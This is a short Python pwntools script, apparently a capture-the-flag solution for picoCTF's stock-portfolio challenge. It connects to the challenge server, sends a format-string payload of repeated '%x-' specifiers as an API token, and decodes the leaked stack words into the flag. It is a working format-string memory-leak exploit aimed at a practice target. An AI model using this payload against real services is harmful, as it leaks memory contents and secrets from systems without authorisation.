#!/usr/bin/python3

from pwn import *

io = remote("mercury.picoctf.net",59616)
#io = process('./vuln')
context.log_level = 'info'

def leaking_api_token():
	io.recvuntil('View my portfolio')
	io.sendline('1')
	io.recvuntil('What is your API token?')
	io.sendline('%x-' * 50)
	io.recvuntil('Buying stonks with token:\n')
	leaked = io.recvline().decode('utf-8').split('-')
	log.info("Leaking memory...")
	return finall_api_token(leaked)

def finall_api_token(leaked):
	flag = ''
	for i in leaked:
		try:
			api = bytearray.fromhex(i).decode()
			flag += api[::-1]
		except:
			continue
	log.success(f'Leaked api token!')
	print(flag + "}")

leaking_api_token()